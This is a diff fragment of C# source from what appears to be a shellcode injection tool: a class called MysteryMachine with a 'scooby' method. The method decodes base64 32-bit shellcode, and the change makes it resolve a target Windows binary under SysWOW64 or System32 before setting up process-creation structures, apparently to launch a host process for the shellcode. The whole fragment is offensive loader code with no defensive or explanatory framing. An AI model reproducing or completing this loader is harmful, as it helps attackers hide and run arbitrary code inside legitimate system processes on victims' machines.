@@ -310,9 +310,28 @@ public class MysteryMachine
         return stringArray;
     }
 
-    public void scooby(string binaryPath, string shellcode32)
+    public void scooby(string binary, string shellcode32)
     {
         byte[] sc = Convert.FromBase64String(shellcode32);
+        string binaryPath;
+
+        if (binary.IndexOf("\\") >= 0)
+        {
+            binaryPath = binary;
+        }
+        else
+        {
+
+            if (Environment.GetEnvironmentVariable("ProgramW6432").Length > 0)
+            {
+                binaryPath = Environment.GetEnvironmentVariable("windir") + "\\SysWOW64\\" + binary;
+            }
+            else
+            {
+                binaryPath = Environment.GetEnvironmentVariable("windir") + "\\System32\\" + binary;
+            }
+        }
+
 
         STARTUPINFO si = new STARTUPINFO();
         PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
